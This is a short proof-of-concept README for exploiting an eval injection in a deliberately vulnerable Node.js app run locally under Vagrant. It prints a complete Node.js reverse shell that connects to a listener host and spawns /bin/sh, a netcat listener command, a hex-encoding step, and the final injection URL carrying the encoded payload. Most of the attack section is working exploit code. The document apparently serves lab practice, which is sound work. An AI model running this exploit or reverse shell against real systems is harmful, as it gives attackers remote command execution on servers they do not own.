# Reverse shell on a Node.js application POC

---

I read the blog post [https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/](https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/) and decided to build a simple Ansible playbook with vagrant.

### Requirements

- Vagrant
- Ansible


### Setup 

    git clone https://github.com/appsecco/vulnerable-apps.git
    vagrant up


- Then request for the following URL. (Checks for the all mathcing with `do*`)


    http://localhost:3000/?name=do*


- Then try the below URL


    http://localhost:3000/?name=["./;require('util').log('Owned');//*"]



### The `Node.js` reverse shell

The Javascript code below is a Node.js reverse shell.

*Remember to change the `IP` address and `PORT` with the `nc` you are running.*

    (function(){
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("/bin/sh", []);
        var client = new net.Socket();
        client.connect(8080, "192.168.33.1", function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /a/; // Prevents the Node.js application form crashing
    })();

Start netcat utility to listen for the reverse shell

    nc -lvp 8080

The sample URL will look like this

    http://localhost:3000/?name=["./;eval(new Buffer('PAYLOAD', 'hex').toString());//*"]

Notice the *PAYLOAD* placeholder in the above URL. 

The *payload* needs to be in hex format. One way to generate the hex payload  by using python

Assign the nodejs reverse shell code to a variable called `payload`

    >>> payload = 'nodejs reverse shell Java Script code'
    >>> payload.encode(hex)

The output will look like this

    2866756e6374696f6e28297b766172206e6574203d207265717569726528226e657422292c6370203d207265717569726528226368696c645f70726f6365737322292c7368203d2063702e737061776e28222f62696e2f7368222c205b5d293b76617220636c69656e74203d206e6577206e65742e536f636b657428293b636c69656e742e636f6e6e65637428383038302c20223139322e3136382e33332e31222c2066756e6374696f6e28297b636c69656e742e706970652873682e737464696e293b73682e7374646f75742e7069706528636c69656e74293b73682e7374646572722e7069706528636c69656e74293b7d293b72657475726e202f612f3b7d2928293b

Therefore the final URL looks like

    http://localhost:3000/?name=["./;eval(new Buffer('2866756e6374696f6e28297b766172206e6574203d207265717569726528226e657422292c6370203d207265717569726528226368696c645f70726f6365737322292c7368203d2063702e737061776e28222f62696e2f7368222c205b5d293b76617220636c69656e74203d206e6577206e65742e536f636b657428293b636c69656e742e636f6e6e65637428383038302c20223139322e3136382e33332e31222c2066756e6374696f6e28297b636c69656e742e706970652873682e737464696e293b73682e7374646f75742e7069706528636c69656e74293b73682e7374646572722e7069706528636c69656e74293b7d293b72657475726e202f612f3b7d2928293b', 'hex').toString());//*"]



Please let me know the feedback [@madhuakula](https://twitter.com/madhuakula)